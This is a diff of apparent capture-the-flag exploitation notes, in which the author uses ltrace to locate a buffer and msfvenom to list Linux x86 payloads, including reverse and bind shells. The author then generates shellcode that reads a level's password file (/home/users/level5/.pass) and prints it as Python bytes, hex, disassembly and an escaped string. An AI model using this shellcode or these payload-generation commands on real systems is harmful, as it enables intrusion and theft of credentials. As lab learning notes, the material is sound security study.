@@ -315,7 +315,7 @@ prctl(1,1);
 ** Get the buffer va
     ltrace
   #+begin_src shell
-        using ltrace -f to follow child we can get the exact va of buffer
+    using ltrace -f to follow child we can get the exact va of buffer
      ltrace -f ./$USER
     [pid 1717] __libc_start_main(0x80486c8, 1, -8972, 0x8048830, 0x80488a0 <unfinished ...>
     [pid 1717] signal(14, 0x0804868f)                                                  = NULL
@@ -543,6 +543,175 @@ may i need to fork to and in the fork execute the shellcode?
             recover esp pointer at  144 + 0xffffdbc0 value should be correct.
             144 - 50 = 94
 #+end_src
+***** Using msfvenom  one
+#+begin_src shell
+    # Using msfvenom to get a shellcode  x86
+    msfvenom -l payload  --platform linux --arch x86 
+
+    Framework Payloads (1680 total) [--payload <value>]
+    ===================================================
+
+        Name                                      Description
+        ----                                      -----------
+        generic/debug_trap                        Generate a debug trap in the target process
+        generic/tight_loop                        Generate a tight loop in the target process
+        linux/x86/adduser                         Create a new user with UID 0
+        linux/x86/chmod                           Runs chmod on specified file with specified mode
+        linux/x86/exec                            Execute an arbitrary command or just a /bin/sh shell
+        linux/x86/meterpreter/bind_ipv6_tcp       Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
+        linux/x86/meterpreter/bind_ipv6_tcp_uuid  Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Sup
+                                                  port (Linux x86)
+        linux/x86/meterpreter/bind_nonx_tcp       Inject the mettle server payload (staged). Listen for a connection
+        linux/x86/meterpreter/bind_tcp            Inject the mettle server payload (staged). Listen for a connection (Linux x86)
+        linux/x86/meterpreter/bind_tcp_uuid       Inject the mettle server payload (staged). Listen for a connection with UUID Support (
+                                                  Linux x86)
+        linux/x86/meterpreter/find_tag            Inject the mettle server payload (staged). Use an established connection
+        linux/x86/meterpreter/reverse_ipv6_tcp    Inject the mettle server payload (staged). Connect back to attacker over IPv6
+        linux/x86/meterpreter/reverse_nonx_tcp    Inject the mettle server payload (staged). Connect back to the attacker
+        linux/x86/meterpreter/reverse_tcp         Inject the mettle server payload (staged). Connect back to the attacker
+        linux/x86/meterpreter/reverse_tcp_uuid    Inject the mettle server payload (staged). Connect back to the attacker
+        linux/x86/meterpreter_reverse_http        Run the Meterpreter / Mettle server payload (stageless)
+        linux/x86/meterpreter_reverse_https       Run the Meterpreter / Mettle server payload (stageless)
+        linux/x86/meterpreter_reverse_tcp         Run the Meterpreter / Mettle server payload (stageless)
+        linux/x86/metsvc_bind_tcp                 Stub payload for interacting with a Meterpreter Service
+        linux/x86/metsvc_reverse_tcp              Stub payload for interacting with a Meterpreter Service
+        linux/x86/read_file                       Read up to 4096 bytes from the local file system and write it back out to the specifie
+                                                  d file descriptor
+        linux/x86/shell/bind_ipv6_tcp             Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
+        linux/x86/shell/bind_ipv6_tcp_uuid        Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux
+                                                   x86)
+        linux/x86/shell/bind_nonx_tcp             Spawn a command shell (staged). Listen for a connection
+        linux/x86/shell/bind_tcp                  Spawn a command shell (staged). Listen for a connection (Linux x86)
+        linux/x86/shell/bind_tcp_uuid             Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
+        linux/x86/shell/find_tag                  Spawn a command shell (staged). Use an established connection
+        linux/x86/shell/reverse_ipv6_tcp          Spawn a command shell (staged). Connect back to attacker over IPv6
+        linux/x86/shell/reverse_nonx_tcp          Spawn a command shell (staged). Connect back to the attacker
+        linux/x86/shell/reverse_tcp               Spawn a command shell (staged). Connect back to the attacker
+        linux/x86/shell/reverse_tcp_uuid          Spawn a command shell (staged). Connect back to the attacker
+        linux/x86/shell_bind_ipv6_tcp             Listen for a connection over IPv6 and spawn a command shell
+        linux/x86/shell_bind_tcp                  Listen for a connection and spawn a command shell
+        linux/x86/shell_bind_tcp_random_port      Listen for a connection in a random port and spawn a command shell. Use nmap to discov
+                                                  er the open port: 'nmap -sS target -p-'.
+        linux/x86/shell_find_port                 Spawn a shell on an established connection
+        linux/x86/shell_find_tag                  Spawn a shell on an established connection (proxy/NAT safe)
+        linux/x86/shell_reverse_tcp               Connect back to attacker and spawn a command shell
+        linux/x86/shell_reverse_tcp_ipv6          Connect back to attacker and spawn a command shell over IPv6
+
+
+    msfvenom -p linux/x86/read_file --list-options  
+    Options for payload/linux/x86/read_file:
+    =========================
+
+
+           Name: Linux Read File
+         Module: payload/linux/x86/read_file
+       Platform: Linux
+           Arch: x86
+    Needs Admin: No
+     Total size: 62
+           Rank: Normal
+
+    Provided by:
+        hal
+
+    Basic options:
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+    FD    1                yes       The file descriptor to write output to
+    PATH                   yes       The file path to read
+
+    Description:
+        Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
+
+
+
+    Advanced options for payload/linux/x86/read_file:
+    =========================
+
+        Name                Current Setting  Required  Description
+        ----                ---------------  --------  -----------
+        AppendExit          false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
+        PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
+        PrependFork         false            no        Prepend a stub that starts the payload in its own process via fork
+        PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
+        PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
+        PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
+        PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
+        PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
+        PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
+        VERBOSE             false            no        Enable detailed status messages
+        WORKSPACE                            no        Specify the workspace for this module
+
+    Evasion options for payload/linux/x86/read_file:
+    =========================
+
+    msfvenom -p linux/x86/read_file PATH=/home/users/level5/.pass  -f python 
+    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+    [-] No arch selected, selecting arch: x86 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 86 bytes
+    Final size of python file: 443 bytes
+    buf =  b""
+    buf += b"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80"
+    buf += b"\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba"
+    buf += b"\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00"
+    buf += b"\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00"
+    buf += b"\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
+    buf += b"\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73"
+    buf += b"\x2f\x6c\x65\x76\x65\x6c\x35\x2f\x2e\x70\x61\x73"
+    buf += b"\x73\x00"
+
+    ┌──(kali㉿kali)-[~]
+    └─$ msfvenom -p linux/x86/read_file --platform  linux --arch x86  PATH=/home/users/level5/.pass  -f hex     
+    No encoder specified, outputting raw payload
+    Payload size: 86 bytes
+    Final size of hex file: 172 bytes
+    eb36b8050000005b31c9cd8089c3b80300000089e789f9ba00100000cd8089c2b804000000bb01000000cd80b801000000bb00000000cd80e8c5ffffff2f686f6d652f75736572732f6c6576656c352f2e7061737300
+    # Best way of output
+    msfvenom -p linux/x86/read_file --platform  linux --arch x86  PATH=/home/users/level5/.pass R | ndisasm -b 32 -                  
+  No encoder specified, outputting raw payload
+  Payload size: 86 bytes
+
+  00000000  EB36              jmp short 0x38
+  00000002  B805000000        mov eax,0x5
+  00000007  5B                pop ebx
+  00000008  31C9              xor ecx,ecx
+  0000000A  CD80              int 0x80
+  0000000C  89C3              mov ebx,eax
+  0000000E  B803000000        mov eax,0x3
+  00000013  89E7              mov edi,esp
+  00000015  89F9              mov ecx,edi
+  00000017  BA00100000        mov edx,0x1000
+  0000001C  CD80              int 0x80
+  0000001E  89C2              mov edx,eax
+  00000020  B804000000        mov eax,0x4
+  00000025  BB01000000        mov ebx,0x1
+  0000002A  CD80              int 0x80
+  0000002C  B801000000        mov eax,0x1
+  00000031  BB00000000        mov ebx,0x0
+  00000036  CD80              int 0x80
+  00000038  E8C5FFFFFF        call 0x2
+  0000003D  2F                das
+  0000003E  686F6D652F        push dword 0x2f656d6f
+  00000043  7573              jnz 0xb8
+  00000045  657273            gs jc 0xbb
+  00000048  2F                das
+  00000049  6C                insb
+  0000004A  657665            gs jna 0xb2
+  0000004D  6C                insb
+  0000004E  352F2E7061        xor eax,0x61702e2f
+  00000053  7373              jnc 0xc8
+  00000055  00                db 0x00
+  #Thx to https://pentesting.substack.com/p/msfvenom-payloads-mega-cheat-sheet-a3d7174739b4
+  ┌──(kali㉿kali)-[~]
+  └─$ msfvenom -p linux/x86/read_file --platform  linux --arch x86  PATH=/home/users/level5/.pass R | hexdump -v -e '"\\\x" 1/1 "%02x"'
+  No encoder specified, outputting raw payload
+  Payload size: 86 bytes
+
+  \xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x35\x2f\x2e\x70\x61\x73\x73\x00 
+#+end_src
+* Want to do test  msvenom.
+
 **** Let's try system
 #+begin_src shell
             b main
